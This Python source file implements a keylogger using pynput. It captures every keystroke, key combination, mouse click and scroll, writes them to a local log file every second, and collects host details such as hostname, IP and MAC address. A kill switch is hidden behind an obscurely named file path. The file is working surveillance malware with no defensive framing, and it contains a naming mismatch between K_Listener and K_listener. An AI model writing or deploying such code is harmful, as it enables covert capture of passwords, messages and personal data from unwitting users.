from pynput.keyboard import Key, Listener as K
from pynput.mouse import  Listener as M
from threading import Timer, Thread
from datetime import datetime
import os, sys
from pathlib import Path
import platform
import psutil, socket, re, uuid, json


# STATIC INPUTS
# kill switch
K_SWITCH_PATH = "./C/Files/Explorer/Foreign/Figma/aW52YWxpZEZpbGU="

# SYS_INFO FILE
SYSTEM_INFO_PATH = Path("./SysInfo/sys_file.txt")
SYSTEM_INFO_PATH.parent.mkdir(parents=True, exist_ok=True)

# logs file
LOGGER_PATH = Path("./Logs/my_log.txt")
LOGGER_PATH.parent.mkdir(parents=True, exist_ok=True)


# Handling PII
class PersonalInformationHandler:
    def __init__(self) -> None:
        self.start_date = datetime.now()
        self.platform_info = ""
    
    # check info 
    def check_info(self):
        try:
            info={}
            info['platform']=platform.system()
            info['platform-release']=platform.release()
            info['platform-version']=platform.version()
            info['architecture']=platform.machine()
            info['hostname']=socket.gethostname()
            info['ip-address']=socket.gethostbyname(socket.gethostname())
            info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
            info['processor']=platform.processor()
            info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
            
            self.platform_info = info
            with SYSTEM_INFO_PATH.open("a") as s_file:
                s_file.write(json.dumps(info))
                s_file.write("\n")
        
        except Exception as e:
            return e




# for user input handling
class KeyLogger:
    def __init__(self) -> None:
        self.log = ""
        self.start_date = datetime.now()
        self.stop_file_path = Path(K_SWITCH_PATH)
        self.K_Listener = None
        self.M_Listener = None
        self.pressed_keys = set() # holding keys for complex combos
    
    # kill switch 
    def check_file(self):
        if self.stop_file_path.exists():
            try:
                os.remove(self.stop_file_path)
                print("successfully stopped and removed")
            except Exception as e:
                print("Could not be stopped")
            
            # stopping both listeners 
            if self.K_Listener:
                self.K_Listener.stop()
            if self.M_Listener:
                self.M_Listener.stop()
            sys.exit(0)
    
    
    # keyboard input
    # -------------------------------------------
    def key_to_str(self, key):
        # if normal key is present return the same
        try:
            return key.char
        except AttributeError:
            # for special keys 
            return key.name.upper() if hasattr(key, "name") else str(key)
    
    
    # a callback to for each key pressed
    def key_press(self, key):
    
        self.pressed_keys.add(key)
        
        if len(self.pressed_keys) == 1:
            self.log += self.key_to_str(key)
        
        # only for combinations 
        if len(self.pressed_keys) > 1:
            combo = "+".join(self.key_to_str(k) for k in self.pressed_keys)
            self.log += combo


    # on release function   
    def key_release(self, key):

        if key in self.pressed_keys:
            self.pressed_keys.remove(key)
        
        if key == Key.esc:
            if self.M_Listener:
                self.M_Listener.stop()
            return False
    
    # Mouse input for keylogger
    # ---------------------------------------
    # Logging each click 
    def mouse_click(self, x, y, button, pressed):
    
        if pressed:
            self.log += f"\nMouse Click: {button} at ({x}, {y})\n"
        else:
            self.log += f"\nMouse Release: {button} at ({x}, {y})\n"
    
    def mouse_scroll(self, x, y, dx, dy):

        self.log += f"\nMouse Scroll: ({x},{y}) dx={dx}, dy={dy}\n"
    
    # -------------------------------------------
    # writing it to a output file
    def report(self):
        with LOGGER_PATH.open("a") as log:
            log.write(self.log)
        self.log = ""
        
        timer = Timer(1, self.report)
        timer.daemon = True
        timer.start()
    
    # -------------------------------------------
    # starting the keylogger 
    def initiation(self):
        self.check_file()
        self.K_listener = K(on_press=self.key_press, on_release=self.key_release)
        self.M_Listener = M(on_click=self.mouse_click, on_scroll=self.mouse_scroll)
        # Start the listener 
        self.K_listener.start()
        self.M_Listener.start()
        
        # start the reporting loop 
        self.report()
        
        # wait for completion 
        self.K_listener.join()
        self.M_Listener.join()
        
logger = KeyLogger()
info_handler = PersonalInformationHandler()
info_handler.check_info()
logger.initiation()
